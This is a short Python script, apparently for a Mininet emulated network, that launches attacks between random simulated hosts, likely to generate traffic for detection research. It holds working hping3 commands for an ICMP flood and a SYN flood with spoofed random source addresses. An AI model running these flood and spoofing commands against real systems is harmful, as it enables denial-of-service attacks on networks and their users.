#this file will be used to generate attacks in the network  this file contains attacks for educationnal purpose ONLY

import random
import time 
def icmp_flood(net):
        src_list= ['h1','h2','h3','h4','h5','h6','h7','h8','h9']
        src_name=random.choice(src_list)
        
        src = net.get(src_name)
        
        dst_name=None
        while dst_name not in ['h1','h2','h3','h4','h5','h6','h7','h8','h9'] or dst_name == src_name:
            
            dst_name = random.choice(src_list)
        dst = net.get(dst_name)
        
        src.cmd(f'hping3 --icmp -c 5000 --flood  {dst.IP()} &') #we gonna send 5000 packets of icmp request using hping3 
        
        
        
def SYN_FLOOD(net):
    src_list= ['h1','h2','h3','h4','h5','h6','h7','h8','h9']
    src_name=random.choice(src_list)
    src = net.get(src_name)
    dst_name=None
    while dst_name not in ['h1','h2','h3','h4','h5','h6','h7','h8','h9'] or dst_name == src_name:   
        dst_name = random.choice(src_list)
        dst = net.get(dst_name)
        
    src.cmd(f'ping -c 3   {dst.IP()}') #First of all the attacker ping the victim 

    src.cmd(f'hping3  -S {dst.IP()} --flood --rand-source &') #we gonna use hping3  and the rand-source command will do what we call AN IP SPOOFING
    
    
    
    
    
      
    

        
        